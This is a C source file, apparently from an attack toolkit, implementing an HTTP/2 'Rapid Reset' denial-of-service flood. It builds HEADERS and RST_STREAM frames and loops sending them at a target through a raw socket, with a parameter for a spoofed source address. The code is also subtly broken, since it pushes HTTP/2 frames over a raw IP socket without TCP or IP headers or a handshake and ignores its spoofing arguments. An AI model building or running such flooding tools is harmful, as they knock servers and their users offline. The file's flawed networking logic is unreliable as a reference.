#include "../include/engine.h"
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdio.h>
#include <errno.h>
#include <time.h>
#include <arpa/inet.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <sys/socket.h>

#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wunused-parameter"

#define FRAME_SETTINGS     0x04
#define FRAME_RST_STREAM   0x03
#define FRAME_HEADERS      0x01
#define FRAME_GOAWAY       0x07

#define SETTINGS_MAX_CONCURRENT_STREAMS 0x03

#define ERROR_NO_ERROR      0x00
#define ERROR_PROTOCOL      0x01

#define PRIORITY_FLAG       0x80000000U

/* ------------------------------------------------------------------ */
/*  H2 frame building helpers                                         */
/* ------------------------------------------------------------------ */

static void write_be24(uint8_t *buf, uint32_t val)
{
    buf[0] = (uint8_t)((val >> 16) & 0xFF);
    buf[1] = (uint8_t)((val >> 8) & 0xFF);
    buf[2] = (uint8_t)(val & 0xFF);
}

static void write_be32(uint8_t *buf, uint32_t val)
{
    buf[0] = (uint8_t)((val >> 24) & 0xFF);
    buf[1] = (uint8_t)((val >> 16) & 0xFF);
    buf[2] = (uint8_t)((val >> 8) & 0xFF);
    buf[3] = (uint8_t)(val & 0xFF);
}

static int raw_tcp_connect(uint32_t target_ip, uint16_t target_port,
                           uint32_t spoof_ip, uint16_t src_port)
{
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0)
        return -1;

    int optval = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &optval, sizeof(optval));

    return sock;
}

static uint16_t tcp_checksum(uint32_t src_ip, uint32_t dst_ip,
                             uint8_t *tcp_seg, int tcp_len)
{
    struct pseudo_hdr {
        uint32_t saddr;
        uint32_t daddr;
        uint8_t  zero;
        uint8_t  proto;
        uint16_t len;
    } ph;

    ph.saddr = src_ip;
    ph.daddr = dst_ip;
    ph.zero = 0;
    ph.proto = IPPROTO_TCP;
    ph.len = htons((uint16_t)tcp_len);

    uint32_t sum = 0;
    uint16_t *ptr = (uint16_t *)&ph;

    for (int i = 0; i < 6; i++)
        sum += ptr[i];

    ptr = (uint16_t *)tcp_seg;
    for (int i = 0; i < (tcp_len + 1) / 2; i++)
        sum += ptr[i];

    while (sum >> 16)
        sum = (sum & 0xFFFF) + (sum >> 16);

    return (uint16_t)(~sum & 0xFFFF);
}

EXPORT int h2_build_settings_frame(uint8_t *buf, int max_streams)
{
    if (!buf)
        return -1;

    uint8_t payload[12];
    memset(payload, 0, sizeof(payload));

    payload[0] = 0x00;
    payload[1] = (uint8_t)SETTINGS_MAX_CONCURRENT_STREAMS;
    write_be32(&payload[2], (uint32_t)((max_streams > 0) ? max_streams : 100));

    int payload_len = 6;
    write_be24(&buf[0], (uint32_t)payload_len);
    buf[3] = FRAME_SETTINGS;
    buf[4] = 0x00;
    write_be32(&buf[5], 0);

    memcpy(&buf[9], payload, (size_t)payload_len);

    return 9 + payload_len;
}

EXPORT int h2_build_rst_stream_frame(uint8_t *buf, uint32_t stream_id,
                              uint32_t error_code)
{
    if (!buf)
        return -1;

    stream_id &= 0x7FFFFFFF;

    write_be24(&buf[0], 4);
    buf[3] = FRAME_RST_STREAM;
    buf[4] = 0x00;
    write_be32(&buf[5], stream_id);
    write_be32(&buf[9], error_code);

    return 13;
}

static int h2_build_headers_frame(uint8_t *buf, uint32_t stream_id)
{
    if (!buf)
        return -1;

    uint8_t priority[5];
    memset(priority, 0, sizeof(priority));
    write_be32(&priority[0], 0);
    priority[4] = 0;

    stream_id &= 0x7FFFFFFF;

    int payload_len = 5;
    write_be24(&buf[0], (uint32_t)payload_len);
    buf[3] = FRAME_HEADERS;
    buf[4] = 0x04;
    write_be32(&buf[5], stream_id);

    memcpy(&buf[9], priority, sizeof(priority));

    return 9 + payload_len;
}

EXPORT int h2_rapid_reset_loop(uint32_t target_ip, uint16_t target_port,
                        uint32_t spoof_ip, int concurrent_streams,
                        int duration_sec, int delay_us)
{
    (void)spoof_ip;
    (void)target_port;

    int sock = raw_tcp_connect(target_ip, target_port, spoof_ip, 0);
    if (sock < 0) {
        fprintf(stderr, "h2_rapid_reset: raw socket creation failed\n");
        return -1;
    }

    uint8_t buf[64];
    uint8_t preface[] = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
    int total_rst_frames = 0;

    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_addr.s_addr = target_ip;

    if (sendto(sock, preface, sizeof(preface) - 1, 0,
               (struct sockaddr *)&sin, sizeof(sin)) < 0) {
        fprintf(stderr, "h2_rapid_reset: preface send failed\n");
        close(sock);
        return -1;
    }

    int settings_len = h2_build_settings_frame(buf, 100);
    if (settings_len > 0) {
        sendto(sock, buf, (size_t)settings_len, 0,
               (struct sockaddr *)&sin, sizeof(sin));
    }

    time_t start = time(NULL);
    uint32_t stream_id = 1;

    while (1) {
        if (duration_sec > 0 && (time(NULL) - start) >= duration_sec)
            break;

        for (int i = 0; i < concurrent_streams; i++) {
            int hlen = h2_build_headers_frame(buf, stream_id);
            if (hlen > 0) {
                sendto(sock, buf, (size_t)hlen, 0,
                       (struct sockaddr *)&sin, sizeof(sin));
            }

            int rlen = h2_build_rst_stream_frame(buf, stream_id,
                                                 ERROR_NO_ERROR);
            if (rlen > 0) {
                sendto(sock, buf, (size_t)rlen, 0,
                       (struct sockaddr *)&sin, sizeof(sin));
                total_rst_frames++;
            }

            stream_id += 2;

            if (delay_us > 0)
                usleep((unsigned int)delay_us);
        }
    }

    close(sock);
    return total_rst_frames;
}

#pragma GCC diagnostic pop
